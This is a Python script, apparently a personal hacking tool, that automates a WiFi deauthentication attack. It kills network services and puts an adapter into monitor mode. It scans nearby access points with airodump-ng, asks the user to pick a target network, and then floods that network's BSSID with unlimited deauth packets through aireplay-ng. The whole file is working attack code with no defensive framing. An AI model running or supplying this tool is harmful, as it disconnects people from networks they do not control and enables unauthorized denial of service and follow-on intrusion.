#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

def check_for_network(network, lst):
    """Verifie si un réseau est déjà dans la liste des réseaux actifs."""
    return not any(network in item["ESSID"] for item in lst)

print(r"""
 _      ____  _     ____  _      _____ ____    ____     _  _  _      _____
/ \__/|/  _ \/ \ /|/  _ \/ \__/|/  __//  _ \  /  _ \   / |/ \/ \__/|/  __/
| |\/||| / \|| |_||| / \|| |\/|||  \  | | \|  | | \|   | || || |\/|||  \  
| |  ||| \_/|| | ||| |-||| |  |||  /_ | |_/|  | |_/|/\_| || || |  |||  /_ 
\_/  \|\____/\_/ \|\_/ \|\_/  \|\____\\____/  \____/\____/\_/\_/  \|\____\
""")
print("\n****************************************************************")
print("\n* Copyright of Mohamed Djimé                             *")
print("\n****************************************************************")

# Verifie si le script est exécuté avec les droits d'administrateur
if 'SUDO_UID' not in os.environ.keys():
    print("Try to run it with sudo.")
    exit()

# Déplace les fichiers .csv vers le dossier de sauvegarde
directory = os.getcwd()
backup_dir = os.path.join(directory, "backup")
os.makedirs(backup_dir, exist_ok=True)
timestamp = datetime.now()

for file_name in os.listdir():
    if file_name.endswith(".csv"):
        shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}-{file_name}"))

# Recherche d'interfaces WiFi disponibles
wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if not check_wifi_result:
    print("Please connect a WiFi adapter and try again.")
    exit()

print("List of available interfaces:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Selection de l'interface pour l'attaque
while True:
    wifi_interface_choice = input("Please choose you wann choose for the attack  ")
    if wifi_interface_choice.isdigit() and int(wifi_interface_choice) in range(len(check_wifi_result)):
        break
    print("Choose the one you wanna attack with the number on the list")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi adapter connected\n")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Wifi adapter entering monitore mode:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Lance la découverte des points d'accès
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

active_networks = []
fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if file_name.endswith(".csv"):
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] != "BSSID" and row["BSSID"] != "Station MAC" and check_for_network(row["ESSID"], active_networks):
                            active_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSSID              |\tChanel|\tESSSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Sélection du réseau à attaquer
while True:
    choice = input("Select a choice from above: ")
    if choice.isdigit() and int(choice) in range(len(active_networks)):
        break
    print(" You can try again.")

hackbssid = active_networks[int(choice)]["BSSID"]
hackchannel = active_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
